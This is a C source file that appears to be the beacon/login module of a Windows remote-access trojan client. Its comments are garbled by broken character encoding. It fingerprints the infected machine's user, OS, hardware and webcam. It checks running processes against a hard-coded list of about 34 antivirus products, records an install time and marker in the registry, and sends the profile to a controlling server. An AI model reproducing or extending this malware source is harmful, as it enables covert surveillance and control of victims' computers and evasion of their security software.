
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
//#include "decode.h"
#include "../../PublicInclude/until.h"
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")


#define GB(x) ((x.HighPart << 2) + ((DWORD)x.LowPart) / 1024.0 / 1024.0 / 1024.0)



//ö����Ƶ�豸
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM ���ʼ��
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum* pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker* pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//������ȡ��Ƶ���ö��������ʹ�����´���
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker* pM;                                            //������ӿ�ָ��
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag* pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pBag);
		//��ȡ�豸����ҳ
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                //������Ƕ���������
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
			if (hr == NOERROR)
			{
				nCam++;
				SysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
			}
			pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
		}
		pM->Release();                        //�ͷż�����ӿ�ָ��
	}
	CoUninitialize();                   //ж��COM��
	return nCam;
}

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices() > 0)
	{
		bRet = TRUE;
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

typedef struct
{
	char* Course;
	char* Name;
}AYSDFE;

AYSDFE g_AntiVirus_Data[40] =
{
	{"360tray.exe",       "360��ȫ��ʿ"},
	{"360sd.exe",         "360ɱ��"},
	{"kxetray.exe",       "��ɽ����"},
	{"KSafeTray.exe",     "��ɽ��ȫ��ʿ"},
	{"QQPCRTP.exe",       "QQ���Թܼ�"},
	{"HipsTray.exe",      "����"},
	{"BaiduSd.exe",       "�ٶ�ɱ��"},
	{"baiduSafeTray.exe", "�ٶ���ʿ"},
	{"KvMonXP.exe",       "����"},
	{"RavMonD.exe",       "����"},
	{"QUHLPSVC.EXE",      "QuickHeal"},   //ӡ��
	{"mssecess.exe",      "΢��MSE"},
	{"cfp.exe",           "Comodoɱ��"},
	{"SPIDer.exe",        "DR.WEB"},      //��֩��
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "����ʿV3"},
	{"AYAgent.aye",       "��������"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},    //�Ұ�ȫ
	{"avp.exe",           "����"},
	{"Mcshield.exe",      "�󿧷�"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "��ţ"},
	{"TMBMSRV.exe",       "����"},
	{"avcenter.exe",      "С��ɡ"},
	{"ashDisp.exe",       "Avast���簲ȫ"},
	{"rtvscan.exe",       "ŵ��"},
	{"remupd.exe",        "��è��ʿ"},
	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe������"}, //����
	{"ad-watch.exe",      "Ad-watch�����"},
	{"K7TSecurity.exe",   "K7ɱ��"},
	{"UnThreat.exe",      "UnThreat"},    //��������
	{"nissrv.exe",      "windows defender"},    //΢��
	{"  ",                "  "}
};

//����ɱ��
char* ssdd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Data[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Data[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}

	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "��δ����");
	}
	return AllName;
}

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//��ȡӲ��
DWORD GetHd()
{
	DWORD num = 0;     //�ܺ�
	char hd[MAX_PATH] = { 0 };
	char* pan = hd;

	if (GetLogicalDriveStringsA(MAX_PATH, hd) > 0)
	{
		while (*pan)
		{
			ULARGE_INTEGER lpTotalNumberOfFreeBytes = { 0 };
			GetDiskFreeSpaceExA(pan, NULL, &lpTotalNumberOfFreeBytes, NULL);
			DWORD g = GB(lpTotalNumberOfFreeBytes);
			num += g;
			pan = pan + strlen(pan) + 1;
		}
	}
	return num;
}

//��ȡϵͳ�汾
void GetOsVer(char* os,DWORD len)
{
	HKEY	hKey;
	DWORD	dwBytes = len;
	DWORD	dwType = REG_SZ;
	RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hKey);
	RegQueryValueEx(hKey, "ProductName", NULL, &dwType, (LPBYTE)os, &dwBytes);
	RegCloseKey(hKey);
}



//����������Ϣ
int sendLoginInfo(CClientSocket* pClient, DWORD dwSpeed, MODIFY_DATA modify_data)
{
	int nRet = SOCKET_ERROR;
	
	// ��¼��Ϣ
	LOGININFO	LoginInfo = {0};
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0; //û������ͷ

	//��ȡ�û���
	DWORD  dwSize = sizeof(LoginInfo.UserName);
	GetUserName(LoginInfo.UserName, &dwSize);

	//��ȡϵͳ�汾
	GetOsVer(LoginInfo.Os, sizeof(LoginInfo.Os));

	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo.nIPAddress, (void*)&sockAddr.sin_addr, sizeof(IN_ADDR));

	//������
	char a[MAX_PATH] = { 0 };
	gethostname(LoginInfo.HostName, 50);

	//��ȡӲ�̴�С
	LoginInfo.HD = GetHd();

	//�ڴ��С
	MEMORYSTATUS    MemInfo;
	MemInfo.dwLength = sizeof(MemInfo);
	GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys / 1024 / 1024;

	//��ȡCPUƵ��
	LoginInfo.CPUClockMhz = CPUClockMhz();

	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);
	LoginInfo.CPUNumber = siSysInfo.dwNumberOfProcessors;

	//��������ͷ
	LoginInfo.bIsWebCam = IsWebCam();

	// �ж�ɱ��
	strcpy(LoginInfo.Virus, ssdd());

	// ���ӷ����������ص�ʱ��
	LoginInfo.dwSpeed = dwSpeed;

	// ��ȡ��ע��Ϣ // ��ȡ��װʱ��

	SYSTEMTIME sys = { 0 };
	GetLocalTime(&sys);
	char Time[0x30] = { 0 };
	wsprintf(Time, "%d-%d-%d-%d:%d", sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute);

	DWORD len = sizeof(LoginInfo.Remark);
	HKEY   hKey;
	if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", &hKey) == 0)
	{
		RegGetValueA(hKey, NULL, "Mark", RRF_RT_REG_SZ, 0, LoginInfo.Remark, &len);
		len = sizeof(LoginInfo.InstallTime);
		if (RegGetValueA(hKey, NULL, "Time", RRF_RT_REG_SZ, 0, LoginInfo.InstallTime, &len) != 0)
		{
			RegSetValueExA(hKey, "Time", 0, REG_SZ, (LPBYTE)Time, strlen(Time) + 1);
			RtlCopyMemory(LoginInfo.InstallTime, Time, 0x30);
		}
		RegCloseKey(hKey);
	}
	else
	{
		
		RtlCopyMemory(LoginInfo.Remark, "error", strlen("error") + 1);
		RtlCopyMemory(LoginInfo.InstallTime, Time, 0x30);
	}
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	
	return nRet;
}
